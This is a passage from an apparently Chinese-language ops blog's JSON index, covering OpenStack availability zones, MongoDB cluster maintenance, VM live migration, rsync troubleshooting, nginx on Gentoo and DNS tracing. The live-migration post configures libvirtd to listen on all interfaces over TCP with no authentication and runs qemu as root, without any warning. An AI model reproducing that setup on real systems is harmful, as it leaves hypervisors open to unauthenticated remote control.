log","slug":"relay-log","permalink":"https://garywu520.github.io/tags/relay-log/"}]},{"title":"问题汇总:openstack可用域availablitiy_zone配置","slug":"问题汇总-openstack可用域availablitiy-zone配置","date":"2018-03-22T02:40:20.000Z","updated":"2018-03-22T04:17:40.149Z","comments":true,"path":"2018/03/22/问题汇总-openstack可用域availablitiy-zone配置/","link":"","permalink":"https://garywu520.github.io/2018/03/22/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-openstack%E5%8F%AF%E7%94%A8%E5%9F%9Favailablitiy-zone%E9%85%8D%E7%BD%AE/","excerpt":"什么是availablitiy_zone(可用域)123Availability Zones 通常是对 computes 节点上的资源在小的区域内进行逻辑上的分组和隔离。例如在同一个数据中心，我们可以将 Availability Zones 规划到不同的机房，或者在同一机房的几个相邻的机架，从而保障如果某个 Availability Zone 的节点发生故障（如供电系统或网络），而不影响其他的 Availability Zones 上节点运行的虚拟机，通过这种划分来提高 OpenStack 的可用性。目前 OpenStack 默认的安装是把所有的 computes 节点划分到 nova 的 Availability Zone 上，但我们可以通过对 nova.conf 文件的配置来定义不同的 Availability zones。","text":"什么是availablitiy_zone(可用域)123Availability Zones 通常是对 computes 节点上的资源在小的区域内进行逻辑上的分组和隔离。例如在同一个数据中心，我们可以将 Availability Zones 规划到不同的机房，或者在同一机房的几个相邻的机架，从而保障如果某个 Availability Zone 的节点发生故障（如供电系统或网络），而不影响其他的 Availability Zones 上节点运行的虚拟机，通过这种划分来提高 OpenStack 的可用性。目前 OpenStack 默认的安装是把所有的 computes 节点划分到 nova 的 Availability Zone 上，但我们可以通过对 nova.conf 文件的配置来定义不同的 Availability zones。 什么是Host Aggregates(主机聚合)1Host Aggregates 是在 Availability Zones 的基础上更进一步地进行逻辑的分组和隔离。例如我们可以根据不同的 computes 节点的物理硬件配置将具有相同共性的物理资源规划在同一 Host Aggregate 之下，或者根据用户的具体需求将几个 computes 节点规划在具有相同用途的同一 Host Aggregate 之下，通过这样的划分有利于提高 OpenStack 资源的使用效率。Host Aggregates 可以通过 nova client 或 API 来创建和配置。 1234如何简单理解主机聚合与可用域？功能类似于阿里云服务器租用选购时，列出的华北区、华南区等。只不过主机聚合与可用域可以区分的更佳细化注：az可用域对用户是可见的，而aggregates聚合只对程序可见，由nova-scheduler使用。 实践12345默认情况下,对Nova的服务分为两类: 一类使Controller节点的服务进程, 如nova-api, nova-scheduler, nova-conductor等另一类使计算节点的进程, 如nova-computer. 对于第一类服务,默认的zone配置项由internal_service_availability_zone决定, 而nova-computer所属的zone配置项由default_available_zone决定. 1.创建Host Aggregates主机聚合,指定可用域1234567注: (1)控制节点默认可用域为internal, 而计算节点可用域默认为nova。(2)一个nova-compute节点只能在一个az(可用域)内，但是可以存在多个aggregate(主机聚合)中。(3)一个计算节点属于多个aggregate,并且具有相同的metadata key，那么这个host的key对应的值为set集合，匹配规则为任一个满足即可。(4)在创建主机聚合的时候可以同时定义一个新的可用域,但是在这个主机聚合中想要添加要管理的计算节点主机时,首先要将所需的计算节点从nova可用域中剔除,否则会报409错误。错误如下:ERROR (Conflict): Cannot add host to aggregate 12. Reason: One or more hosts already in availability zone(s) [u&#39;nova&#39;]. (HTTP 409) (Request-ID: req-81aa55b5-0bb2-47e1-89c2-4d64ac9c9a8c) 12345创建一个主机聚合名称,同时创建一个可用域az1nova aggregate-create aggregate_name az1查看主机聚合与可用域nova aggregate-list 2.添加主机12把主机添加到对应的主机聚合中nova aggregate-add-host aggregate_name computer1 3. 查询主机与服务所属的availablitiy zone12nova host-listnova service-list 帮助命令12查看可用域状态nova availability-zone-list 123456789101112nova help | grep &#39;aggregateaggregate-add-host Add the host to the specified aggregate.aggregate-create Create a new aggregate with the specifiedaggregate-delete Delete the aggregate.aggregate-details Show details of the specified aggregate.aggregate-list Print a list of all aggregates.aggregate-remove-host Remove the specified host from the specified aggregate.aggregate-set-metadata Update the metadata associated with the aggregate.aggregate-update Update the aggregate&#39;s name and optionally 1234567nova help aggregate-createusage: nova aggregate-create &lt;name&gt; [&lt;availability-zone&gt;]Create a new aggregate with the specified details.Positional arguments: &lt;name&gt; Name of aggregate. &lt;availability-zone&gt; The availability zone of the aggregate (optional). 参考：Github","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"可用域","slug":"可用域","permalink":"https://garywu520.github.io/tags/%E5%8F%AF%E7%94%A8%E5%9F%9F/"},{"name":"availablitiy_zone","slug":"availablitiy-zone","permalink":"https://garywu520.github.io/tags/availablitiy-zone/"},{"name":"aggregate host","slug":"aggregate-host","permalink":"https://garywu520.github.io/tags/aggregate-host/"},{"name":"nova schedule","slug":"nova-schedule","permalink":"https://garywu520.github.io/tags/nova-schedule/"},{"name":"az","slug":"az","permalink":"https://garywu520.github.io/tags/az/"}]},{"title":"云计算三种服务模式:IaaS和PaaS及SaaS","slug":"云计算三种服务模式-IaaS和PaaS及SaaS","date":"2018-03-21T02:44:06.000Z","updated":"2018-03-21T11:46:19.156Z","comments":true,"path":"2018/03/21/云计算三种服务模式-IaaS和PaaS及SaaS/","link":"","permalink":"https://garywu520.github.io/2018/03/21/%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%89%E7%A7%8D%E6%9C%8D%E5%8A%A1%E6%A8%A1%E5%BC%8F-IaaS%E5%92%8CPaaS%E5%8F%8ASaaS/","excerpt":"1自己搞openstack有段时间了,但对于IaaS、PaaS和SaaS并没有深入的概念或者说它们各自解决了哪些问题...今天就再来温习下","text":"1自己搞openstack有段时间了,但对于IaaS、PaaS和SaaS并没有深入的概念或者说它们各自解决了哪些问题...今天就再来温习下 云也是分层的123456其实云计算分几层的，分别是:Infrastructure（基础设施)-as-a-ServicePlatform（平台)-as-a-ServiceSoftware（软件)-as-a-Service。基础设施在最下端，平台在中间，软件在顶端。别的一些“软”的层可以在这些层上面添加。 IaaS: Infrastructure-as-a-Service（基础设施即服务）12345第一层叫做IaaS，有时候也叫做Hardware-as-a-Service. 这一层解决了底层的硬件、网络、存储、底层服务和虚拟化，用户无需关心服务器硬件是否有异常，直接控制OS去随心使用。典型的开源产品即OpenStack,以及Amazon, Microsoft, VMWare, Rackspace和Red Hat等公司提供的商业产品。 PaaS: Platform-as-a-Service（平台即服务）12345第二层就是所谓的PaaS，某些时候也叫做中间件。这一层在IaaS的基础上解决了OS操作系统、Middleware中间件以及RUNTIME, 此时用户无需关心我运行的是什么操作系统，也不需要关心操作系统是否存在bug需要升级，用户只需关心，自己控制运行的服务和数据是否正常或安全即可。典型的开源产品如Docker以及K8S SaaS: Software-as-a-Service（软件即服务）12345这一层是SaaS, 这一层如何理解？这一层不需要用户操心任何与硬件和操作系统有关的问题, 直接购买服务使用即可，需要关注的就是我所购买或免费使用的这个服务是否正常，当出现问题我直接去找售后处理。这样的产品很多，比如：企业邮箱、Facebook、微信等等","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"IaaS","slug":"IaaS","permalink":"https://garywu520.github.io/tags/IaaS/"},{"name":"PaaS","slug":"PaaS","permalink":"https://garywu520.github.io/tags/PaaS/"},{"name":"SaaS","slug":"SaaS","permalink":"https://garywu520.github.io/tags/SaaS/"}]},{"title":"rsync同步时导致服务器重启-故障记录","slug":"rsync同步时导致服务器重启-故障记录","date":"2018-03-20T09:45:55.000Z","updated":"2018-03-20T10:32:38.264Z","comments":true,"path":"2018/03/20/rsync同步时导致服务器重启-故障记录/","link":"","permalink":"https://garywu520.github.io/2018/03/20/rsync%E5%90%8C%E6%AD%A5%E6%97%B6%E5%AF%BC%E8%87%B4%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%87%8D%E5%90%AF-%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","excerpt":"123生产环境有台服务器专用于各种数据备份归档, 突然有一短时间rsync服务器基本在固定时间凌晨3点左右自重启。以下为故障彻查记录, 便于日后查阅。","text":"123生产环境有台服务器专用于各种数据备份归档, 突然有一短时间rsync服务器基本在固定时间凌晨3点左右自重启。以下为故障彻查记录, 便于日后查阅。 解决思路及过程为什么会那么准时导致服务器重启1这个问题很好查证, 很快我们就定位到了问题点。是因为有台代码服务器crontab配置在了凌晨3点10分左右开始通过脚本自动同步。日志没有任何有价值信息, 同步为什么会导致服务器重启呢？实在无解... 怀疑配置文件问题1首先怀疑配置文件问题, 配置文件修改了数次, 手动测试推送，刚按回车，rsync服务器立即重启，最后都以失败告终。 怀疑是版本bug1其次是怀疑rsync版本存在bug，官方下载最新版本编译安装, 替换现有的rsync命令的软链,再测试，rsync服务器立即重启...... #####从文件大小入手测试 1这次卷土重来, 先手动推送一个小文件测试（大小5M以内), 推送成功，至少说明配置没问题。稍大文件（33M）继续推送, rsync服务器立马重启...... 这TM就呵呵了, 什么鬼？ 123抽根烟淡定后, 继续搞......去看了看rsync服务器被推送到的目录, ls的结果异常缓慢,需要等待约5秒左右才能显示。此时貌似想到了什么问题...修改配置文件, 把rsync推送过来的数据目录更换为其他磁盘分区的目录(权限也需配置)，再测试rsync大文件推送, 我靠，没问题了！感人... 1初步结论: 大文件推送的时候, rsync服务器指定的目录磁盘io异常高,触发了服务器BIOS的保护机制,导致服务器重启。这结论没毛病啊......后来与老大沟通后一致认为,导致磁盘io异常的原因可能是磁！盘！坏！道！ 处理方案123456(1)查看现有备份目录所在磁盘以及现有文件所占用的大小(2)准备资料迁移服务器或磁盘或盘柜(3)现有资料迁移(4)格式化现有磁盘, 再进行rsync推送测试若问题依旧存在,直接进行硬盘更换","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"rsync","slug":"rsync","permalink":"https://garywu520.github.io/tags/rsync/"},{"name":"自重启","slug":"自重启","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E9%87%8D%E5%90%AF/"},{"name":"磁盘坏道","slug":"磁盘坏道","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98%E5%9D%8F%E9%81%93/"}]},{"title":"gentoo emerge编译nginx","slug":"gentoo-emerge编译nginx","date":"2018-03-17T03:50:56.000Z","updated":"2018-03-17T04:19:16.038Z","comments":true,"path":"2018/03/17/gentoo-emerge编译nginx/","link":"","permalink":"https://garywu520.github.io/2018/03/17/gentoo-emerge%E7%BC%96%E8%AF%91nginx/","excerpt":"12nginx是一个稳定、轻量、高性能的web服务器以及反向代理服务器...扯蛋完毕。来说下如何利用gentoo特性来编译nginx","text":"12nginx是一个稳定、轻量、高性能的web服务器以及反向代理服务器...扯蛋完毕。来说下如何利用gentoo特性来编译nginx 安装Nginx1234567在gentoo中, 想要安装nginx,如何搜索它的包名称呢？eix nginx #eix工具可以很方便的检索到符合条件的软件全称emerge --ask www-servers&#x2F;nginx&#x2F;etc&#x2F;init.d&#x2F;nginx startrc-update add nginx default 后期补充Nginx扩展12345安装之前,需要了解其扩展USE标记, Nginx使用模块来增加它的功能。HTTP相关的模块可以通过设置 NGINX_MODULES_HTTP 变量使其生效邮件相关的模块可以通过设置 NGINX_MODULES_MAIL 变量使其生效第三方模块需要设置 NGINX_ADD_MODULES 变量 1234567这些变量需要在&#x2F;etc&#x2F;portage&#x2F;make.conf中进行设置,例如:使 fastcgi 模块生效vim &#x2F;etc&#x2F;portage&#x2F;make.confNGINX_MODULES_HTTP&#x3D;&quot;fastcgi&quot;注：上面的操作会覆盖默认 NGINX_MODULES_HTTP 的默认值，并且把他设置为fastcgi。要开启fastcgi 模块且不覆盖 NGINX_MODULES_HTTP的默认值，你需要使用USE标志vim &#x2F;etc&#x2F;portage&#x2F;make.confwww-servers&#x2F;nginx NGINX_MODULES_HTTP: fastcgi 如果你需要查询某个官方模块,请参考官方list 1234再举个例子：目前nginx已经提供服务,但现在我想增加连接数限制模块vim &#x2F;etc&#x2F;portage&#x2F;make.confwww-servers&#x2F;nginx NGINX_MODULES_HTTP: fastcgi limit_conn 1234设置完USE标记后,如何只安装这个扩展呢？emerge --ask www-servers&#x2F;nginx 此时,emerge包管理器会自动检索USE标记所对应的安装包，确认后输入Yes自动编译安装即可。 验证扩展安装1nginx中配置限速参数, 最后nginx -t检查语法, 没有报错误说明限速扩展添加成功。 参考：Gentoo zh-cn","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"emerge","slug":"emerge","permalink":"https://garywu520.github.io/tags/emerge/"},{"name":"gentoo","slug":"gentoo","permalink":"https://garywu520.github.io/tags/gentoo/"},{"name":"编译nginx","slug":"编译nginx","permalink":"https://garywu520.github.io/tags/%E7%BC%96%E8%AF%91nginx/"}]},{"title":"MongoDB集群节点-添加移除管理维护","slug":"MongoDB集群节点添加移除管理维护","date":"2018-03-16T10:34:41.000Z","updated":"2018-08-07T09:40:17.925Z","comments":true,"path":"2018/03/16/MongoDB集群节点添加移除管理维护/","link":"","permalink":"https://garywu520.github.io/2018/03/16/MongoDB%E9%9B%86%E7%BE%A4%E8%8A%82%E7%82%B9%E6%B7%BB%E5%8A%A0%E7%A7%BB%E9%99%A4%E7%AE%A1%E7%90%86%E7%BB%B4%E6%8A%A4/","excerpt":"1此操作在mongo V3.0已验证","text":"1此操作在mongo V3.0已验证 mongo添加副本集或迁移流程 12345671. 准备新增副本节点，确保目录权限正常、服务启动正常，日志正常2. 查看要加入的集群节点信息rs.status()或rs.config()或rs.isMaster()3. 节点加入集群并配置为不参与选举和配置成隐藏节点4. 添加新增副本节点zabbix监控5. 横向关注相关服务器资源占用，如网络io和CPU使用，是否影响服务器其他业务等6. 待新增副本初始化完数据，将其从集群移除并重新以SECOND身份加入（不加priority和hidden参数）7. 【可选】移除老节点 MongoDB数据初始化同步大小与主库不一致？ 123Mongo V2版本，当一个从库加入集群后，进行数据初始化，初始化的数据一般情况下，数据会比主库数据量要小一些。原因是这样：比如主库原来有10G数据，删了5个G数据，但使用du -sh查看的时候物理文件还是10G，但从库数据初始化只会同步已有数据（不包含已删除的数据），所以它会比主库小，这是正常的状态。而Mongo V3+版本已经优化了这个问题，所以数据与主库是一致的。 关于Mongo升级 1加入现在是2.6的版本，升级时必须先升级3.0再升级3.2，按照顺序升级，请勿跳过直接升级高版本 1.集群运行时添加节点123456789查看复制集节点配置.&#x2F;mongo 192.168.1.207:27017db.version() 查看版本 3.2.11 rs0:PRIMARY&gt; rs.conf(); 查看集群配置文件或rs0:PRIMARY&gt; rs.isMaster(); 添加节点 123456789101112131415161718192021222324添加新的数据目录mkdir –p &#x2F;mongodb&#x2F;data&#x2F;shard4启动节点.&#x2F;mongod –shardsvr –replSet shard1 –port 27019 –dbpath &#x2F;mongodb&#x2F;data&#x2F;shard4 –oplogSize 100 –logpath &#x2F;mongodb&#x2F;data&#x2F;shard4.log –logappend –fork连接主节点mongo 192.168.1.207:27017查看集群配置文件rs0:PRIMARY&gt; rs.isMaster(); 添加节点注：集群中添加节点时，务必配置新增节点为隐藏节点，配置优先级为0即可实现，目的是防止其升为主节点.等数据完成同步后，再将其移除节点并重新加入集群节点（此时不配置priority和hidden）rs0:PRIMARY&gt; rs.add(&#123;&quot;_id&quot;:4,&quot;192.168.1.207:27019&quot;,&quot;priority&quot;:0,&quot;hidden&quot;:true&#125;);&#123; &quot;ok&quot; : 1 &#125;--------------------------------------------或通过以下方式配置隐藏节点cfg &#x3D; rs.conf()cfg.members[4].priority &#x3D; 0cfg.members[4].hidden &#x3D; truers.reconfig(cfg)-------------------------------------------- 注：!!!集群动态配置可直接将IP[添加为或]更换为域名且不需要重启mongodb服务！！！ 1234rs0:PRIMARY&gt; rs.add(&#123;&quot;_id&quot;:4,&quot;node1.exaple.com:27019&quot;,&quot;priority&quot;:0,&quot;hidden&quot;:true&#125;);&#123; &quot;ok&quot; : 1 &#125;针对线上业务，不建议修改mongodb配置文件中的BindIp为域名，这种方式需要重启服务，代价较大 再次查看状态 123456再次查看状态rs0:PRIMARY&gt; rs.conf();或rs0:PRIMARY&gt; rs.isMaster();能看到新增节点说明添加成功 2. 设定节点优先级1优先级值越高,就是主节点 12在新增节点的时候设定该节点的优先级别repSetTest:PRIMARY&gt; rs.add(&#123;&quot;_id&quot;:3,&quot;host&quot;:&quot;localhost:27000&quot;,&quot;priority&quot;:1.5&#125;) 1234567891011通过下面的方式修改优先级别repSetTest:PRIMARY&gt; var config&#x3D;rs.config()repSetTest:PRIMARY&gt; config.members[2].priority&#x3D;22repSetTest:PRIMARY&gt; rs.reconfig(config)&#123; &quot;ok&quot; : 1 &#125;注意：第2步members大括号里面的取值(从0开始往下数,顺序值)和_id是没有关系的。这些操作必须在Primary上进行。 3. Mongodb运行时-移除节点12345678连接主节点mongo 192.168.1.207:27017rs0:PRIMARY&gt; rs.remove(&quot;192.168.1.207:27019&quot;); 此处输入移除命令最后还需要关掉192.168.1.207:27019 该服务Ps –ef | grep mongo 查找该服务然后通过kill -9 pid 关闭服务, 测试没问题之后清理配置文件 4. MongoDB运行时移除分片12345678910111213141516171819202122Mongodb运行时移除分片1、连接mongos节点 .&#x2F;mongo 192.168.1.207:30000&#x2F;admin2、运行db.runCommand( &#123; removeshard: &quot;your_shard_name&quot; &#125; )&#123; msg : &quot;draining started successfully&quot;, state: &quot;started&quot;, shard :&quot;mongodb0&quot;, ok : 1 &#125;3、查看状态，我们可以反复执行上面语句查看执行状态db.runCommand( &#123; removeshard: &quot;your_shard_name&quot; &#125; )&#123; msg: &quot;draining ongoing&quot;, state: &quot;ongoing&quot;, remaining: &#123; chunks: 42, dbs : 1 &#125;, ok: 1说明正在迁移中。4、移除非shard数据db.runCommand( &#123; movePrimary: &quot;myapp&quot;, to: &quot;mongodb1&quot; &#125;)这次就不是立即返回了，需要很久，然后会返回如下：&#123; &quot;primary&quot; : &quot;mongodb1&quot;, &quot;ok&quot; : 1 &#125;5、上面步骤都完成后，还需要再执行一次RemoveShard，清理残余数据。db.runCommand( &#123; removeshard: &quot;mongodb0&quot; &#125; )显示completed后，就可以安心的关闭mongod的进程了。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://garywu520.github.io/tags/MongoDB/"},{"name":"MongoDB集群","slug":"MongoDB集群","permalink":"https://garywu520.github.io/tags/MongoDB%E9%9B%86%E7%BE%A4/"},{"name":"mongo集群管理维护","slug":"mongo集群管理维护","permalink":"https://garywu520.github.io/tags/mongo%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%BB%B4%E6%8A%A4/"}]},{"title":"问题汇总: VM热迁移live migration","slug":"问题汇总-VM热迁移live-migration","date":"2018-03-16T04:11:19.000Z","updated":"2018-03-16T07:32:39.809Z","comments":true,"path":"2018/03/16/问题汇总-VM热迁移live-migration/","link":"","permalink":"https://garywu520.github.io/2018/03/16/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-VM%E7%83%AD%E8%BF%81%E7%A7%BBlive-migration/","excerpt":"适用场景12热迁移: 在保证源和目标计算节点都存活的情况下,可进行热迁移。但当计算节点宕机后,vm虚拟机并不能进行自动热迁移, 也可通过脚本检测VM存活然后去触发迁移","text":"适用场景12热迁移: 在保证源和目标计算节点都存活的情况下,可进行热迁移。但当计算节点宕机后,vm虚拟机并不能进行自动热迁移, 也可通过脚本检测VM存活然后去触发迁移 热迁移[Live Migration]前提条件12345671. 源和目标节点的CPU类型要一致。 2. 源和目标节点的Libvirt版本要一致。3. 源和目标节点能相互识别对方的主机名称【即在&#x2F;etc&#x2F;hosts 中加入对方的条目】4. 源和目标节点的 Libvirt TCP 远程监听服务得打开 &#x2F;etc&#x2F;libvirt&#x2F;libvirtd.conf5. 在源和目标节点的nova.conf中指明在线迁移时使用 TCP 协议。 &#x2F;etc&#x2F;nova&#x2F;nova.conf 修改libvirt配置文件【所有节点】1234567&#x2F;etc&#x2F;libvirt&#x2F;libvirtd.conf 修改为如下内容:listen_tls &#x3D; 0 listen_tcp &#x3D; 1 auth_tcp &#x3D; &quot;none&quot; listen_addr &#x3D; &quot;0.0.0.0&quot; tcp_port &#x3D; &quot;16509&quot; 123&#x2F;etc&#x2F;sysconfig&#x2F;libvirtd 修改为如下内容:LIBVIRTD_ARGS&#x3D;&quot;--listen&quot; 123456&#x2F;etc&#x2F;libvirt&#x2F;qemu.conf 修改为如下内容:vnc_listen &#x3D; &quot;0.0.0.0&quot;user &#x3D; &quot;root&quot;group &#x3D; &quot;root&quot;dynamic_ownership &#x3D; 1 修改nova配置【所有节点】1234567&#x2F;etc&#x2F;nova&#x2F;nova.conf 修改为如下内容：[libvirt]live_migration_downtime &#x3D; 500live_migration_downtime_steps &#x3D; 10live_migration_downtime_delay &#x3D; 75live_migration_flag&#x3D;VIR_MIGRATE_UNDEFINE_SOURCE,VIR_MIGRATE_PEER2PEER,VIR_MIGRATE_LIVE,VIR_MIGRATE_TUNNELLED 重启服务【所有节点】123#重启服务systemctl restart libvirtdsystemctl restart openstack-nova-compute 热迁移-步骤【控制节点】12345678910111213141516#查看VM实例nova list#查看当前VM运行在哪个节点上nova show f3d749ba-98e1-4624-9782-6da729ad164c#查看可用计算节点nova service-list#查看要迁移的节点的资源使用情况(CPU&#x2F;内存&#x2F;硬盘)nova host-describe &#123;Host&#125;#开始迁移(此命令不返回错误即为成功)nova live-migration 要热迁移的VM_ID &#123;Host&#125;注：如果不指明要迁移到的计算节点, 则使用nova自行调度","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"nova","slug":"nova","permalink":"https://garywu520.github.io/tags/nova/"},{"name":"libvert","slug":"libvert","permalink":"https://garywu520.github.io/tags/libvert/"},{"name":"热迁移 live migration","slug":"热迁移-live-migration","permalink":"https://garywu520.github.io/tags/%E7%83%AD%E8%BF%81%E7%A7%BB-live-migration/"},{"name":"动态迁移","slug":"动态迁移","permalink":"https://garywu520.github.io/tags/%E5%8A%A8%E6%80%81%E8%BF%81%E7%A7%BB/"}]},{"title":"问题汇总-openstack如何将VM分配到固定计算节点","slug":"问题汇总-openstack如何将VM分配到固定计算节点","date":"2018-03-15T07:13:24.000Z","updated":"2018-03-16T03:33:05.585Z","comments":true,"path":"2018/03/15/问题汇总-openstack如何将VM分配到固定计算节点/","link":"","permalink":"https://garywu520.github.io/2018/03/15/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-openstack%E5%A6%82%E4%BD%95%E5%B0%86VM%E5%88%86%E9%85%8D%E5%88%B0%E5%9B%BA%E5%AE%9A%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9/","excerpt":"1注: N版经测试不支持","text":"1注: N版经测试不支持 如何保证新增一台虚拟机100%分配到其中一台固定的计算节点？ 1234567由于nova的调度原因,调度后的虚拟机并不是在我们想要的计算节点。这时候需要在WEB界面新建一个可用域,如SSD. 然后把我们想加入到这个可用域的计算节点添加进来(2)web中创建一台虚拟机,选择SSD可用域,创建完成后,确保虚拟机运行正常(3)去这个计算节点查看 virsh list --all 这个时候虚拟机就100%分配到新增的计算节点 参考：Host Aggregates 与 Availability Zones","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"VM","slug":"VM","permalink":"https://garywu520.github.io/tags/VM/"},{"name":"主机聚合 Host Aggregates","slug":"主机聚合-Host-Aggregates","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E6%9C%BA%E8%81%9A%E5%90%88-Host-Aggregates/"},{"name":"可用域 Availability Zones","slug":"可用域-Availability-Zones","permalink":"https://garywu520.github.io/tags/%E5%8F%AF%E7%94%A8%E5%9F%9F-Availability-Zones/"},{"name":"schedule","slug":"schedule","permalink":"https://garywu520.github.io/tags/schedule/"}]},{"title":"问题汇总-OpenStack VM随计算节点自启动","slug":"问题汇总-OpenStack-VM随计算节点自启动","date":"2018-03-14T03:02:29.000Z","updated":"2018-03-16T06:24:33.412Z","comments":true,"path":"2018/03/14/问题汇总-OpenStack-VM随计算节点自启动/","link":"","permalink":"https://garywu520.github.io/2018/03/14/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-OpenStack-VM%E9%9A%8F%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9%E8%87%AA%E5%90%AF%E5%8A%A8/","excerpt":"1适用场景: 自己琢磨","text":"1适用场景: 自己琢磨 12345678910111213141516171819202122232425(1)在所有计算节点上, 使用命令查看所有已经运行的instance实例virsh list --allId 名称 状态----------------------------------------------------84 instance-0000010b running106 instance-00000159 running117 instance-00000179 running......(2) 查看所有Instance实例的自启动情况virsh list --autostartId 名称 状态----------------------------------------------------(3) 将Instance实例添加自启动命令格式: virsh autostart Idvirsh autostart 84(4)再次查看所有Instance实例自启动情况 virsh list --autostart 关闭自启 virsh autostart --disable Id","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"vm","slug":"vm","permalink":"https://garywu520.github.io/tags/vm/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"},{"name":"autostart","slug":"autostart","permalink":"https://garywu520.github.io/tags/autostart/"}]},{"title":"问题汇总-给openstack VM创建静态IP","slug":"问题汇总-给openstack VM创建静态IP","date":"2018-03-14T02:08:57.000Z","updated":"2018-03-14T03:06:03.466Z","comments":true,"path":"2018/03/14/问题汇总-给openstack VM创建静态IP/","link":"","permalink":"https://garywu520.github.io/2018/03/14/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB-%E7%BB%99openstack%20VM%E5%88%9B%E5%BB%BA%E9%9D%99%E6%80%81IP/","excerpt":"1由于业务需要, 需给openstack虚拟机添加静态IP地址，下面说说正确姿势。","text":"1由于业务需要, 需给openstack虚拟机添加静态IP地址，下面说说正确姿势。 121. 首先正常创建一台VM虚拟机(IP为自动分配), 查看其分配的IP地址2. 在控制节点执行如下操作 12345678910111213142.1 查看所有运行的虚拟机网络信息 neutron port-list2.2 更新VM虚拟机的IP地址为静态 查看命令帮助 neutron port-update --help 命令格式：neutron port-update --fixed-ip subnet_id&#x3D;要修改的VM的SUBNET,ip_address&#x3D;新IP 要修改的VM的id修改示例:neutron port-update --fixed-ip subnet_id&#x3D;11ae5e0a-3f61-4ea0-870c-e75a279ce2b5,ip_address&#x3D;192.168.56.100 7d813df1-d32a-4bb2-a217-df672d0daeae2.3 需重启虚拟机即可生效 或者 修改vm系统内的IP地址为新修改的IP地址,然后重启网卡","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"VM","slug":"VM","permalink":"https://garywu520.github.io/tags/VM/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"},{"name":"neutron","slug":"neutron","permalink":"https://garywu520.github.io/tags/neutron/"},{"name":"static IP","slug":"static-IP","permalink":"https://garywu520.github.io/tags/static-IP/"},{"name":"静态IP","slug":"静态IP","permalink":"https://garywu520.github.io/tags/%E9%9D%99%E6%80%81IP/"},{"name":"port-update","slug":"port-update","permalink":"https://garywu520.github.io/tags/port-update/"}]},{"title":"DNS故障排除与解决","slug":"DNS故障排除与解决","date":"2018-03-13T04:10:00.000Z","updated":"2019-03-13T06:27:11.394Z","comments":true,"path":"2018/03/13/DNS故障排除与解决/","link":"","permalink":"https://garywu520.github.io/2018/03/13/DNS%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4%E4%B8%8E%E8%A7%A3%E5%86%B3/","excerpt":"","text":"首先要追踪DNS查询过程1dig +trace www.qq.com 在执行结果中，除了13个顶级域之外，其他的DNS均有可能出现数据错误的可能性，可能是他们的DNS数据刷新时间过程中出现了异常。顶级域返回错误的结果时，就需要使用“+trace”参数 这个+trace参数两个功能： 追踪DNS查询过程 强制从顶级域开始查询","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"DNS","slug":"DNS","permalink":"https://garywu520.github.io/tags/DNS/"},{"name":"Bind","slug":"Bind","permalink":"https://garywu520.github.io/tags/Bind/"},{"name":"Unbound","slug":"Unbound","permalink":"https://garywu520.github.io/tags/Unbound/"}]},{"title":"iptables设置规范","slug":"iptables设置规范","date":"2018-03-11T09:22:33.000Z","updated":"2020-07-04T08:13:54.725Z","comments":true,"path":"2018/03/11/iptables设置规范/","link":"","permalink":"https://garywu520.github.io/2018/03/11/iptables%E8%AE%BE%E7%BD%AE%E8%A7%84%E8%8C%83/","excerpt":"一、Iptables配置流程：先放行(务必包括SSH、本地回环以及已建立链)，后拒绝所有 二、关于Dockeriptables里面新增了docker项，除了iptables外，还需要配置docker启动配置文件，来关闭iptables动态将规则写入。 参考：Docker与iptables防火墙","text":"一、Iptables配置流程：先放行(务必包括SSH、本地回环以及已建立链)，后拒绝所有 二、关于Dockeriptables里面新增了docker项，除了iptables外，还需要配置docker启动配置文件，来关闭iptables动态将规则写入。 参考：Docker与iptables防火墙 三、优雅使用Iptablescat /var/scripts/iptables.sh 1234567891011121314151617181920212223242526272829303132333435#!/bin/bash#清除规则iptables 